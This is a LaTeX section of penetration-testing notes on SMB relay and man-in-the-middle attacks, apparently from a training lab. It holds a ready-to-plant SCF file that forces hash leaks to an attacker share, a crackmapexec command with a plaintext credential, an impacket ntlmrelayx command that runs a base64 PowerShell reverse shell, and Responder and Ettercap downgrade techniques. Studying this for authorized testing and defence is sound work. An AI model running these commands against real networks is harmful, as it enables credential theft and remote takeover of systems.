\section{Man-in-the-middle attack on SMB Relays}

two technics:
\begin{itemize}
    \item capturing hashes and cracking them (impacket smbserver, responder)
    \item capturing the hashed and replaying them to another machine (
        impacket ntlmrelayx or Responder MultiRelay.py)
\end{itemize}

\subsection{SCF file attack}
\label{smb:scf}

It is not new that SCF (Shell Command Files) files can be used to perform a
limited set of operations such as showing the Windows desktop or opening a
Windows explorer. However a SCF file can be used to access a specific UNC path
which allows the penetration tester to build an attack. The code below can be
placed inside a text file which then needs to be planted into a network share.

\begin{verbatim}
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
\end{verbatim}


with cme:
\begin{verbatim}
crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! \
    -M slinky -o SERVER=10.10.14.33 NAME=important
\end{verbatim}


\subsection{Impacket smbserver}
\begin{verbatim}
smbserver.py -smb2support pwn_share ./
\end{verbatim}

\subsection{Impacket ntlmrelayx}

Create a PowerShell reverse shell using
\href{https://www.revshells.com/}{https://www.revshells.com/} with base64
    encoding
\begin{verbatim}
ntlmrelayx --no-http-server -smb2support -t IP -c \
    'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqA.. .'
\end{verbatim}

\subsection{Responder}
\begin{verbatim}
sudo responder -I INTERFACE -rPvf
\end{verbatim}

\subsection{Inveigh}

\subsection{Intercepter-ng}
Intercepter-NG is a multifunctional network toolkit for IT professionals of
various types. The main goal is to restore interesting data from the network
stream and perform various kinds of man-in-the-middle attacks (MiTM). In
addition, the program allows you to detect ARP spoofing (can be used to detect
MiTM), identify and exploit some types of vulnerabilities, brute-force login
credentials for network services. The program can work both with live traffic
flow and analyze files with captured traffic to detect files and credentials.

SMB related features:
\begin{itemize}
    \item Reconstructing files from SMB
    \item SMB relay
    \item SMB Hijack (interception)
\end{itemize}

\subsection{Ettercap. Ettercap Plugins}

Ettercap is a comprehensive man-in-the-middle (MiTM) attack kit. It is able to
sniff live connections, filter on the fly the contents of the transmitted data
and many other tricks. It supports active and passive tampering of many
protocols and includes many functions for network and host analysis.

Among the Ettercap plugins, there are two plugins aimed at attacking the SMB
protocol. 

 \subsubsection{smb\_clear}

It forces the client to send smb password in clear text distorting protocol
negotiations. You must be in the middle of the connection to use it
successfully. It hooks the smb dissector, so you will keep it active. If you
use it against a Windows client, then the result is unlikely to be successful.
Try it against *nix smbclient.

\subsubsection{smb\_down}

It forces the client not to use NTLM2 password exchange during smb
authentication. Thus, hashes are obtained that can easily be cracked in LC4.
You must be in the middle of the connection to use it successfully. It hooks
the smb dissector, so you will keep it active.
